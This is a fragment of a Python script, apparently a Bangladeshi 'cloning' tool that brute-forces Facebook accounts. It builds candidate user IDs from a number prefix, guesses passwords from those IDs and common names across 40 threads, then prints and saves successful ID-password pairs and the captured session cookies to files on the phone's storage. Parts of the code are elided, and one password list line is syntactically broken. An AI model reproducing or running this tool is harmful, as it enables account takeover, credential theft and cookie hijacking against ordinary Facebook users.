#--------------++CREATED     + SELIM AHAMED++-----------------#
#--------------++FACEBOOK  + SELIM AHAMED++----------------#
#--------------++ GITHUB        + SL143+--------------------------#
...
try:
        ...
        os.system('python SL.py')


os.system('xdg-open https://www.facebook.com/SELIM.AHAMED.RAFI.OFFICIAL.ID?mibextid=ZbWKwL)
#-------------color----------------#
...
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝ 
╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
║\33[0;45m      [ TOOLS CREATED BY : SELIM AHAMED ]     \033[0;92m║
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
...
def TARA_LOVE():
    clear()
    os.system('xdg-open https://github.com/selimahamed143/selimahamed.git')
    ...
    if option in ['01','1']:
        BD_CLONING()
    if option in ['02','2']:
    	os.system('xdg-open https://www.facebook.com/SELIM.AHAMED.RAFI.OFFICIAL.ID?mibextid=ZbWKwL');time.sleep(1)
    if option in ['03','3']:
    	os.system('xdg-open https://wa.me/+8801609246937');time.sleep(1)
    else:
...
def BD_CLONING():
    ...
    with tred(max_workers=40) as Tara:
        ...
        for psx in user:
            ids=code+psx
            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'sadiya','jannat','abir123','taniya'riya123,tamanna,habiba12,khadiza12]
        ...
        for pas in passlist:
            ...
            if 'session_key' in reqx:
                ...
                if str(uid) in oks:
                    ...
                    print('\r\r \033[1;32m[SL-OK] '+str(uid)+' | '+pas+'\033[1;37m')
                    coki=";".join(i["name"]+"="+i["value"] for i in reqx["session_cookies"])
                    print('\033[1;37m [COOKIE-🌺] '+coki)
                    open('/sdcard/SL-OK.txt','a').write(str(uid)+' | '+pas+'\n')
                    oks.append(str(uid))
                    break
            elif 'www.facebook.com' in reqx['error_msg']:
                print('\r\r \033[1;35m[SL-CP] '+ids+' | '+pas+'\033[1;37m')
                open('/sdcard/SL-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:
                continue
